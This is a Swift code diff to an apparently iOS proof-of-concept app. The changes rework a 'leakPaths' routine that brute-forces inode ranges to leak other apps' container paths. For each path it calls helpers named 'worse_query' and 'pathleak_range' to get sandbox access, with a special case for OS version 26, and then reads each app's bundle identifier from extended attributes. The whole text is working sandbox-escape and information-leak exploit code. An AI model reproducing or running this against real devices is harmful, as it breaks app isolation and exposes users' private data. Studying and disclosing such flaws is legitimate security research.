@@ -10,7 +10,7 @@ import SwiftUI
 struct ContentView: View {
     @StateObject private var console = Console()
     @State private var sandboxHandle: Int64?
-    @State private var path = "/private/var/mobile/Containers/Shared/AppGroup/"
+    @State private var path = "/private/var/mobile/Containers/Data/Application/"
     
     var body: some View {
         NavigationStack {
@@ -88,45 +88,70 @@ struct ContentView: View {
     
     func leakPaths(_ filter: String) {
         let files = FileManager.default
-        let baselineURL = files.temporaryDirectory.appendingPathComponent(".baseline_\(UUID().uuidString)")
+        // Use App Group container for baseline — same inode range as other app containers
+        let groupRoot = files.containerURL(forSecurityApplicationGroupIdentifier: "group.com.xb.wqtest")
+        let baseDir = groupRoot ?? files.temporaryDirectory
+        let baselineURL = baseDir.appendingPathComponent(".baseline_\(UUID().uuidString)")
         var baselineInode: UInt64 = 0
         do {
             try "helloworld".write(to: baselineURL, atomically: true, encoding: .utf8)
             var baselineInfo = stat()
             let baselinePath = baselineURL.path
-            
+
             if stat(baselinePath, &baselineInfo) == 0 {
                 baselineInode = baselineInfo.st_ino
-                print("baseline: \(baselineInode)")
+                print("baseline: \(baselineInode) (from \(baseDir.lastPathComponent))")
             } else {
                 print("Failed to get baseline inode!")
             }
-            
+
             try files.removeItem(at: baselineURL)
         } catch {
             print("Failed to get baseline inode: \(error)")
             return
         }
         
-        print("This is gonna take a while...")
-        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
-            let paths = pathleak(filter, baselineInode) ?? []
-            print(paths.count)
-            for path in paths {
-                let handle = consumeExtension(path)
-                if handle > 0 {
-                    var buf = [CChar](repeating: 0, count: 512)
-                    let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
-                    if len > 0 {
-                        let bundleID = String(cString: buf)
-                        print()
-                        print(bundleID + ": " + path)
-                        print()
+        DispatchQueue.global(qos: .userInitiated).async {
+            let window: UInt64 = 2_000_000
+            let minRecent = baselineInode > window ? baselineInode - window : 1
+
+            func scanRange(_ lo: UInt64, _ hi: UInt64) {
+                let paths = pathleak_range(filter, lo, hi) ?? []
+                for path in paths {
+                    let isAppGroup = path.contains("/var/mobile/Containers/Shared/AppGroup")
+                    let needsWorkaround = isAppGroup && ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26
+                    let handle = worse_query(path, "group.com.xb.wqtest", needsWorkaround, false)
+                    if handle > 0 {
+                        var buf = [CChar](repeating: 0, count: 512)
+                        let len = getxattr(path, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
+                        if len > 0 {
+                            let bundleID = String(cString: buf)
+                            DispatchQueue.main.async {
+                                print()
+                                print(bundleID + ": " + path)
+                                print()
+                            }
+                        }
+                        worse_query_release(handle)
                     }
-                    releaseExtension(handle)
                 }
             }
-            print("Done!")
+
+            // Pass 1: recent inodes (fast, catches newly-installed apps)
+            scanRange(minRecent, baselineInode)
+
+            // Pass 2: older inodes in 5M chunks
+            if minRecent > 1 {
+                var hi = minRecent - 1
+                let chunk: UInt64 = 5_000_000
+                while hi > 0 {
+                    let lo = hi > chunk ? hi - chunk + 1 : 1
+                    scanRange(lo, hi)
+                    if lo == 1 { break }
+                    hi = lo - 1
+                }
+            }
+            DispatchQueue.main.async { print("--- done ---") }
         }
     }
     
@@ -178,9 +203,9 @@ struct ContentView: View {
         
         var handle: Int64 = -255
         if path.contains("/var/mobile/Containers/Shared/AppGroup") && ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 26 {
-            handle = worse_query(path, "group.cc.forcequit.worse-query", true, false)
+            handle = worse_query(path, "group.com.xb.wqtest", true, false)
         } else {
-            handle = worse_query(path, "group.cc.forcequit.worse-query", false, false)
+            handle = worse_query(path, "group.com.xb.wqtest", false, false)
         }
         switch handle {
         case -1:
